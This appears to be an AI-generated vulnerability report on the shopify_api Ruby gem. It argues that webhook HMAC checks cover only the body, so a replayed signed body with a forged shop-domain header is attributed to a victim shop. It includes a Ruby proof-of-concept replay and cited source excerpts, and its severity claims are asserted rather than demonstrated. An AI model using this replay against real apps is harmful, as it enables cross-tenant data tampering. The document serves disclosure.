Confirmed root cause. Providing final analysis.

### Title
Webhook `shop-domain` header is trusted without being covered by the HMAC signature, allowing cross-tenant webhook spoofing - ([File: lib/shopify_api/webhooks/request.rb])

### Summary
`ShopifyAPI::Webhooks::Request#to_signable_string` returns only the raw HTTP body, excluding the `shop-domain`, `topic`, and `webhook-id` headers from the HMAC-covered content. `ShopifyAPI::Webhooks::Registry.process` validates the HMAC over that incomplete signable string and then trusts the unauthenticated `shop-domain` header to attribute the webhook payload to a specific tenant. Because the app-level `api_secret_key` used to sign webhooks is shared across every shop that has the app installed, any shop that installs the app can capture one legitimately-signed `(body, hmac)` pair and replay it with a forged `shop-domain` header, causing the host application to process the body as belonging to a different (victim) shop while the HMAC still validates.

### Finding Description
`ShopifyAPI::Webhooks::Request` extracts identity fields from headers that are not authenticated by the HMAC: [1](#0-0) 

`shop` is read straight from the `shopify-shop-domain` header, while `to_signable_string` returns only `@raw_body`: [2](#0-1) 

`Utils::HmacValidator.validate` only checks that the computed HMAC over `to_signable_string` (i.e., the raw body) matches the received signature — it never binds `shop`, `topic`, or `webhook_id` into the signed material: [3](#0-2) 

`Registry.process` uses this validated-but-incomplete request to dispatch a `WebhookMetadata` object with the unauthenticated `shop` value directly to the app's webhook handler: [4](#0-3) 

The binding that is broken is:
```
shop authenticated by HMAC  !=  shop delivered to the handler (WebhookMetadata#shop)
```
The HMAC only proves "this body was signed with the app's `api_secret_key`" (i.e., "some installed shop produced this exact body"), not "this body came from the shop named in the `shop-domain` header." Since the same `api_secret_key` is shared by every shop that installs the app, an attacker who controls a shop (a normal, unprivileged install — no elevated Shopify permissions, access tokens, or `client_secret` needed) can:
1. Install the app on their own shop and capture any legitimately Shopify-signed webhook request (valid `raw_body` + `x-shopify-hmac-sha256`).
2. Replay that exact request to the app's webhook endpoint, substituting the `x-shopify-shop-domain` header with a victim shop's domain.
3. `Utils::HmacValidator.validate` still returns `true` because the signature only covers `raw_body`, which is unchanged.
4. `Registry.process` calls the registered handler with `WebhookMetadata#shop` set to the victim's domain, even though the payload actually originated from the attacker's shop.

### Impact Explanation
This is a cross-tenant identity confusion: the host application's webhook handler (which typically keys database writes, GDPR redaction, order/customer sync, uninstall/redact processing, etc. by the `shop` field of `WebhookMetadata`) will process attacker-controlled body content under a victim shop's identity. Depending on the handler, this can corrupt or overwrite a victim shop's stored data (e.g., forged `shop/redact` or `app/uninstalled` events, or forged order/product data injected into the victim's records) — a cross-tenant access/integrity violation reachable by any user who can install the app on a shop they control, without needing the victim's access token, `client_secret`, or any privileged credential.

### Likelihood Explanation
Likelihood is high: the attacker only needs to be able to install the app on any shop (a normal, publicly available action for public apps) to obtain one authentic `(body, hmac)` pair, and webhook endpoints are public HTTP(S) endpoints that accept POSTed requests without additional authentication beyond the HMAC check implemented in this gem. No credential theft, TLS interception, or social engineering is required.

### Recommendation
Bind the tenant identity into the material that is HMAC-verified, or otherwise cryptographically tie the `shop-domain` header to the verified payload before it is trusted:
- Include `shop`, `topic`, and `webhook_id` (or at minimum `shop`) in `Request#to_signable_string` if Shopify's signing scheme is changed to support it, or
- Independently verify the `shop-domain` header against a value known/expected for the specific webhook subscription (e.g., compare it to the shop associated with the registration/session that triggered the webhook, or validate it against a per-shop allowlist maintained by the host app) rather than trusting the header at face value once the generic HMAC check passes.
- At minimum, document prominently that `WebhookMetadata#shop` is unauthenticated and must not be used as a sole tenant key without additional verification by the host application.

### Proof of Concept
```ruby
require "shopify_api"

ShopifyAPI::Context.setup(
  api_key: "key",
  api_secret_key: "shared_app_secret", # same secret for every installed shop
  host: "app.example.com",
  scope: "read_products",
  is_embedded: true,
  is_private: false,
  api_version: "2024-01"
)

# Attacker installs the app on their own shop "attacker-shop.myshopify.com" and
# captures a legitimately Shopify-signed webhook, e.g. for "orders/create":
raw_body = '{"id": 1, "malicious_field": "payload"}'
hmac = OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), "shared_app_secret", raw_body)

# Attacker replays the exact same signed body, but swaps the shop-domain header
forged_headers = {
  "x-shopify-topic" => "orders/create",
  "x-shopify-hmac-sha256" => Base64.encode64(hmac), # unchanged, still valid
  "x-shopify-shop-domain" => "victim-shop.myshopify.com", # forged
  "x-shopify-webhook-id" => "forged-id",
  "x-shopify-api-version" => "2024-01",
}

forged_request = ShopifyAPI::Webhooks::Request.new(raw_body: raw_body, headers: forged_headers)

# HMAC validation succeeds because it only checks the (unchanged) raw_body:
ShopifyAPI::Utils::HmacValidator.validate(forged_request) # => true

# Registry.process will now invoke the app's handler believing this payload
# came from "victim-shop.myshopify.com":
ShopifyAPI::Webhooks::Registry.process(forged_request)
```
`WebhookMetadata#shop` delivered to the handler is `"victim-shop.myshopify.com"`, even though the signed body was produced by the attacker's own shop installation, demonstrating the broken `shop`-identity binding.

### Citations

**File:** lib/shopify_api/webhooks/request.rb (L10-43)
```ruby
      sig { override.returns(String) }
      def hmac
        Digest.hexencode(Base64.decode64(T.cast(shopify_header("hmac-sha256"), String)))
      end

      sig { returns(String) }
      def topic
        T.cast(shopify_header("topic"), String)
      end

      sig { returns(String) }
      def shop
        T.cast(shopify_header("shop-domain"), String)
      end

      sig { returns(String) }
      def api_version
        T.cast(shopify_header("api-version"), String)
      end

      sig { returns(String) }
      def webhook_id
        T.cast(shopify_header("webhook-id"), String)
      end

      sig { override.returns(String) }
      def to_signable_string
        @raw_body
      end

      sig { returns(T::Hash[String, T.untyped]) }
      def parsed_body
        JSON.parse(@raw_body)
      end
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-31)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end

        private

        sig { params(verifiable_query: VerifiableQuery, secret: String).returns(T::Boolean) }
        def validate_signature(verifiable_query, secret)
          received_signature = verifiable_query.hmac
          computed_signature = compute_signature(verifiable_query.to_signable_string, secret)
          OpenSSL.secure_compare(computed_signature, T.must(received_signature))
        end
```

**File:** lib/shopify_api/webhooks/registry.rb (L188-199)
```ruby
        sig { params(request: Request).void }
        def process(request)
          raise Errors::InvalidWebhookError, "Invalid webhook HMAC." unless Utils::HmacValidator.validate(request)

          handler = @registry[request.topic]&.handler

          unless handler
            raise Errors::NoWebhookHandler, "No webhook handler found for topic: #{request.topic}."
          end

          handler.handle(data: WebhookMetadata.new(topic: request.topic, shop: request.shop,
            body: request.parsed_body, api_version: request.api_version, webhook_id: request.webhook_id))
```
